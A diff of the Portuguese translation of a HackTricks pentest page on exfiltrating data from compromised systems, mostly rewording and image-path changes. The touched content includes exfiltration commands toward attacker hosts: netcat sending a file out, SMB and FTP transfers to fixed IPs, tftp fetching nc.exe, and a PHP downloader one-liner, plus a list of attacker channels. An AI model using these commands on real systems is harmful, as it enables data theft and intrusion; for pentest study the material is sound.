@@ -6,8 +6,8 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
@@ -16,7 +16,7 @@ Outras maneiras de apoiar o HackTricks:
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -150,7 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### Cliente **Windows**
+### **Cliente** Windows
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -187,21 +187,33 @@ service smbd restart
 ```
 Windows
 
-## Exfiltração
+## Exfiltração de Dados
 
 ### Ferramentas e Técnicas
 
-Existem várias ferramentas e técnicas que podem ser usadas para exfiltrar dados de um sistema Windows comprometido. Algumas das técnicas comuns incluem:
+#### 1. **FTP**
 
-- **Utilitários de linha de comando**: Utilização de utilitários como `bitsadmin`, `certutil`, `wmic`, `powershell`, entre outros, para transferir dados para um servidor remoto.
-- **Protocolos de rede**: Uso de protocolos como HTTP, HTTPS, DNS, SMB, entre outros, para enviar dados para fora da rede comprometida.
-- **Túneis criptografados**: Estabelecimento de túneis criptografados usando ferramentas como `Mimikatz` ou `PsExec` para enviar dados de forma segura.
-- **Steganography**: Ocultação de dados dentro de arquivos de imagem, áudio ou vídeo para evitar detecção.
-- **Uso de APIs do Windows**: Exploração de APIs do Windows para acessar e exfiltrar dados de forma programática.
+   - **Descrição:** O FTP (File Transfer Protocol) é um protocolo padrão para transferência de arquivos em redes TCP/IP.
+   - **Como Usar:** Use um cliente FTP para enviar arquivos para um servidor remoto controlado pelo atacante.
+
+#### 2. **Web Services**
+
+   - **Descrição:** Serviços da web como Dropbox, Google Drive e OneDrive podem ser usados para exfiltrar dados.
+   - **Como Usar:** Faça o upload de arquivos sensíveis para uma conta de serviço da web controlada pelo atacante.
+
+#### 3. **Email**
+
+   - **Descrição:** O email pode ser usado para enviar dados confidenciais para um endereço controlado pelo atacante.
+   - **Como Usar:** Anexe arquivos sensíveis a um email e envie para o endereço designado.
+
+#### 4. **DNS**
+
+   - **Descrição:** O DNS (Domain Name System) pode ser usado para exfiltrar dados através de solicitações DNS maliciosas.
+   - **Como Usar:** Configure um servidor DNS controlado pelo atacante para receber dados exfiltrados.
 
 ### Considerações Finais
 
-É importante estar ciente das várias técnicas de exfiltração disponíveis em sistemas Windows para poder detectar e mitigar possíveis vazamentos de dados. O monitoramento contínuo do tráfego de rede, do uso de utilitários do sistema e da atividade do sistema pode ajudar a identificar atividades suspeitas e prevenir a perda não autorizada de dados.
+A exfiltração de dados é uma etapa crítica em um teste de invasão, pois permite que um atacante mova informações confidenciais para fora da rede comprometida. É importante estar ciente das diferentes ferramentas e técnicas disponíveis para exfiltrar dados de um sistema Windows.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -224,25 +236,6 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
-
-### Network Channels
-
-#### Description
-
-Network Channels (NC) are techniques used to exfiltrate data over network protocols. This can include common protocols such as HTTP, DNS, ICMP, or even custom protocols developed by an attacker. Network Channels are often used during post-exploitation phases to avoid detection by security controls that may be monitoring traditional channels.
-
-#### Resources
-
-- [**Chisel**](https://github.com/jpillora/chisel): A fast TCP tunnel over HTTP.
-- [**Dnscat2**](https://github.com/iagox86/dnscat2): A tool designed to create an encrypted command-and-control (C&C) channel over the DNS protocol.
-- [**Iodine**](https://code.kryo.se/iodine/): Tunnel IPv4 data through a DNS server.
-- [**C2Ch**](https://github.com/krmaxwell/c2ch): Command and control over HTTP.
-
-#### Considerations
-
-- Network Channels can be used to bypass network filtering rules that only allow specific protocols or ports.
-- Encrypted channels can help evade detection by security devices that are not able to inspect encrypted traffic.
-- Monitoring network traffic for anomalies can help detect the use of Network Channels for data exfiltration.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -309,11 +302,13 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Baixe um arquivo com um PHP oneliner:
+Baixe um arquivo com um oneliner PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
+
+VBScript (Visual Basic Scripting Edition) é uma linguagem de script da Microsoft baseada em Visual Basic. É comumente usada para automatizar tarefas em sistemas Windows e pode ser usada para exfiltração de dados de forma sigilosa.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -367,7 +362,7 @@ Em seguida, copie e cole o texto no windows-shell e um arquivo chamado nc.exe se
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -377,10 +372,10 @@ Em seguida, copie e cole o texto no windows-shell e um arquivo chamado nc.exe se
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
